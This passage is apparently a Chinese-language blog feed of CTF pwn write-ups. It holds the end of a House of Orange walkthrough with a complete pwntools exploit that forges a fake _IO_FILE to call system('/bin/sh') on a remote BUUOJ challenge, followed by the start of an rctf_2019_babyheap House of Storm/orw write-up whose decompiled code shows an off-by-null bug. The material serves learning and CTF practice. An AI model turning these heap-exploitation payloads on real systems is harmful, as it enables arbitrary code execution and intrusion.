alt="在这里插入图片描述"></p><p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br>edit<span class="hljs-comment">(0x10, payload)</span><br>show<span class="hljs-comment">()</span><br>ru<span class="hljs-comment">('b'*0x10)</span><br>heap = u<span class="hljs-number">64</span><span class="hljs-comment">(sh.recvuntil('\n')</span>.strip<span class="hljs-comment">()</span>.ljust<span class="hljs-comment">(8, '\x00')</span>)<br>heap_base = heap - <span class="hljs-number">0</span>xE<span class="hljs-number">0</span><br>lg<span class="hljs-comment">('heap_base',heap_base)</span><br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake_file"></a>构造fake_file</h3><p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p><p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gcode">dbg<span class="hljs-comment">()</span><br>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">400</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x21)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(1)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span><br>fake_file = <span class="hljs-string">'/bin/sh\x00'</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(0x61)</span><span class="hljs-attr">#to small bin</span><br><span class="hljs-attr">fake_file += p64</span><span class="hljs-comment">(0)</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(io_list_all-0x10)</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(1)</span><span class="hljs-attr">#_IO_write_base &lt; _IO_write_ptr</span><br><span class="hljs-attr">fake_file = fake_file.ljust(0</span>xc<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>)<br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">3</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(heap_base+0x5E8)</span> <span class="hljs-attr">#vtable ptr</span><br><span class="hljs-attr">fake_file += p64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">2</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(system)</span><br>payload += fake_file<br>edit<span class="hljs-comment">(len(payload)</span>, payload)<br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"Your choice : "</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import  *<br> <br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,<span class="hljs-built_in">debug</span><br> <br>binary = <span class="hljs-string">'./houseoforange_hitcon_2016'</span>  <br><span class="hljs-comment">#sh = process(binary) #连接本地程序</span><br>sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,26188) #连接远程程序<br>elf = ELF(binary)     <br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)  <br><br><span class="hljs-comment">#libc-2.23.so--64</span><br>one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]<br>one_gadget[0] = 0x45216<br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims  :sh.recvuntil(delims )<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-attribute">lg</span>=lambda address,data<span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br>def <span class="hljs-built_in">add</span>(size, content, <span class="hljs-attribute">price</span>=<span class="hljs-string">'2'</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">'1'</span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name :"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    #1-7<br>    sl(str(color))<br><br><br>def show():<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br><br>def <span class="hljs-built_in">edit</span>(size, content, <span class="hljs-attribute">price</span>=<span class="hljs-string">'2'</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">'1'</span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name:"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    #1-7<br>    sl(str(color))<br><br><br><br><span class="hljs-built_in">add</span>(0x30,<span class="hljs-string">'aaaa\n'</span>)<br><span class="hljs-comment">#dbg()</span><br>payload = <span class="hljs-string">'a'</span> * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)<br> <br><span class="hljs-built_in">edit</span>(len(payload), payload)<br><span class="hljs-comment">#dbg()</span><br><span class="hljs-built_in">add</span>(0x1000, <span class="hljs-string">'a\n'</span>)<br><span class="hljs-comment">#dbg()</span><br><span class="hljs-built_in">add</span>(0x400, <span class="hljs-string">'a'</span> * 8)<br><span class="hljs-comment">#dbg()</span><br>show()<br>ru(<span class="hljs-string">'a'</span><span class="hljs-number">*8</span>)<br>libc.address = u64(ru(<span class="hljs-string">'\x7f'</span>).ljust(8, <span class="hljs-string">'\x00'</span>)) - 0x3c5188<br>lg(<span class="hljs-string">'libc.address'</span>,libc.address)<br>  <br>io_list_all = libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc.symbols[<span class="hljs-string">'system'</span>]<br><br>payload = <span class="hljs-string">'b'</span> * 0x10<br> <br><br><span class="hljs-built_in">edit</span>(0x10, payload)<br><br>show()<br>ru(<span class="hljs-string">'b'</span><span class="hljs-number">*0</span>x10)<br>heap = u64(sh.recvuntil(<span class="hljs-string">'\n'</span>).strip().ljust(8, <span class="hljs-string">'\x00'</span>))<br>heap_base = heap - 0xE0<br>lg(<span class="hljs-string">'heap_base'</span>,heap_base)<br><span class="hljs-comment">#dbg()</span><br> <br>payload = <span class="hljs-string">'a'</span> * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)<br>fake_file = <span class="hljs-string">'/bin/sh\x00'</span>+p64(0x61)#<span class="hljs-keyword">to</span> small bin<br>fake_file += p64(0)+p64(io_list_all-0x10)<br>fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr<br>fake_file = fake_file.ljust(0xc0,<span class="hljs-string">'\x00'</span>)<br>fake_file += p64(0) * 3<br>fake_file += p64(heap_base+0x5E8) #vtable ptr<br>fake_file += p64(0) * 2<br>fake_file += p64(system)<br>payload += fake_file<br><span class="hljs-built_in">edit</span>(len(payload), payload)<br><span class="hljs-comment">#dbg()</span><br> <br>ru(<span class="hljs-string">"Your choice : "</span>)<br>sl(<span class="hljs-string">'1'</span>)<br><br>itr()<br></code></pre></td></tr></tbody></table></figure><p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><blockquote><p>参考文章<br><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;House-of-orange&quot;&gt;&lt;a href=&quot;#House-of-orange&quot; class=&quot;headerlink&quot; title=&quot;House of orange&quot;&gt;&lt;/a&gt;House of orange&lt;/h1&gt;&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Storm + 堆SROP + orw</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:43.801Z</updated>
    
    <content type="html"><![CDATA[<p><strong>同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，<br>若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。</strong></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。<br>看一下ida</p><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p>可以看到是实现了四个功能，增改删查</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-built_in">init</span>(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">menu</span>();<br>    <span class="hljs-keyword">switch</span> ( <span class="hljs-built_in">get_int</span>() )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">add</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">edit</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">delete</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">show</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time!"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid choice!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><p>可以申请最大0x1000大小的chunk，最多申请16个chunk</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">void</span> **v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; *(ptrs + <span class="hljs-number">2</span> * i) &amp;&amp; i &lt;= <span class="hljs-number">15</span>; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">16</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You can't"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  }<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>  size = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0x1000</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid size :("</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    *(ptrs + <span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>) = size;<br>    v0 = (ptrs + <span class="hljs-number">16</span> * i);<br>    *v0 = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Add success :)"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><p>存在off-by-null漏洞</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(ptrs + <span class="hljs-number">2</span> * v1) )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>    *(*(ptrs + <span class="hljs-number">2</span> * v1) + <span class="hljs-built_in">read_n</span>(*(ptrs + <span class="hljs-number">2</span> * v1), *(ptrs + <span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>))) = <span class="hljs-number">0</span>; <span class="hljs-comment">//off-by-one</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Edit success :)"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index :("</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(ptrs + <span class="hljs-number">2</span> * v1) )<br>  {<br>    <span class="hljs-built_in">free</span>(*(ptrs + <span class="hljs-number">2</span> * v1));<br>    *(ptrs + <span class="hljs-number">2</span> * v1) = <span class="hljs-number">0LL</span>;<br>    *(ptrs + <span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Delete success :)"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index :("</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(ptrs + <span class="hljs-number">2</span> * v1) )<br>    <span class="hljs-built_in">puts</span>(*(ptrs + <span class="hljs-number">2</span> * v1));<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index :("</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>看了大佬的博客<a href="https://blog.csdn.net/weixin_44145820/article/details/105709145">rctf_2019_babyheap</a>，这里对其进行详细的解析。<br class='item-img' data-src='https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。</p><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>先把前面的写好</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>#sh = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">29278</span>)<br><span 